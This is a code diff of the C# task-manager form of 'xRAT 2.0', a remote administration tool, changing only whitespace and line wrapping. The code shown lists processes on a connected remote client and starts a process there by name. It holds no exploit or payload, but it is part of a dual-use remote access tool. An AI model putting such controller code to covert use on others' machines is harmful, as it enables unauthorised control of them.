@@ -15,7 +15,7 @@ namespace xRAT_2.Forms
             cClient.Value.frmTM = this;
 
             InitializeComponent();
-            
+
             lvwColumnSorter = new ListViewColumnSorter();
             lstTasks.ListViewItemSorter = lvwColumnSorter;
         }
@@ -24,7 +24,8 @@ namespace xRAT_2.Forms
         {
             if (cClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - Task Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
+                this.Text = string.Format("xRAT 2.0 - Task Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(),
+                    cClient.EndPoint.Port.ToString());
                 new Core.Packets.ServerPackets.GetProcesses().Execute(cClient);
             }
         }
@@ -49,7 +50,8 @@ namespace xRAT_2.Forms
         private void ctxtStartProcess_Click(object sender, EventArgs e)
         {
             string processname = string.Empty;
-            if (InputBox.Show("Processname", "Enter Processname:", ref processname) == System.Windows.Forms.DialogResult.OK)
+            if (InputBox.Show("Processname", "Enter Processname:", ref processname) ==
+                System.Windows.Forms.DialogResult.OK)
             {
                 if (cClient != null)
                     new Core.Packets.ServerPackets.StartProcess(processname).Execute(cClient);
